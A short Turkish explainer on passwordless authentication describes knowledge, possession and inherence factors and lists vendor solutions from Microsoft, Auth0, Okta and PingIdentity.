Parolasız kimlik doğrulama, parola dışında bir kimlik doğrulama faktörü kullanıldığında elde edilir. Parola bir bilgi faktörüdür, yani kullanıcının bildiği bir şeydir. Yalnızca bilgi faktörüne güvenmenin sorunu, hırsızlığa, paylaşıma, tekrar kullanıma, kötüye kullanıma ve diğer risklere karşı savunmasız olmasıdır. Parolasız kimlik doğrulama nihayetinde artık parola olmaması anlamına gelir. Bunun yerine, kullanıcı kimliğini daha büyük bir güvenceyle doğrulamak için bir kullanıcının sahip olduğu bir şey olan sahiplik faktörüne veya bir kullanıcının olduğu doğal bir faktöre dayanır.

Yeni teknoloji ve standartlar geliştikçe, bu alternatiflerin kimlik doğrulama süreci için ihtiyaç duyduğumuz güvenliği sağlayıp sağlamayacağını anlamak için uygulamanın ayrıntılarını araştırmamız ve anlamamız gerekir. Parolasız kimlik doğrulama ve farklı satıcıların stratejileri hakkında daha fazla bilgi edinebilirsiniz:

* Microsoft Parolasız
* Auth0 Şifresiz
* Okta Şifresiz
* PingIdentity

Şifreleri korumak söz konusu olduğunda birçok seçenek vardır. Doğru olanı seçmek, bireyin veya şirketin gereksinimlerine bağlı olacaktır. Kişilerin ve şirketlerin çeşitli amaçlar için farklı parola koruma yöntemleri kullanması yaygındır.


